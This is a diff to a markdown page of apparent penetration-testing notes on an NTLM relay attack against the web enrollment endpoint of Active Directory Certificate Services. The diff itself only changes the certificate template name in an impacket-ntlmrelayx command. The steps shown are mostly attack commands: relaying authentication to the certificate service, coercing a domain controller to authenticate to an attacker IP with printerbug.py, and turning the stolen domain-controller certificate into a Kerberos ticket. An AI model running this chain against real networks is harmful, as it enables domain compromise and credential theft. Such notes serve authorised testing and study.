@@ -11,7 +11,7 @@ NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enroll
 
 #### Exploit Steps
 
-* `impacket-ntlmrelayx -t http://<CA-IP>/certsrv/certfnsh.asp --adcs -smb2support --template <template-name>`  <sup><sub>listen for inbound connections & relay them to web enrollment service<sub></sup>
+* `impacket-ntlmrelayx -t http://<CA-IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication`  <sup><sub>(listen for inbound connections & relay them to web enrollment service)<sub></sup>
 * Wait or Force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
   * `python3 printerbug.py domain/username:"password"@<DC-IP> <Attacker-IP>`&#x20;
 * `python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01$.pfx -dc-ip <IP> 'domain/DC-Machine Account' /tmp/dc.ccache`&#x20;
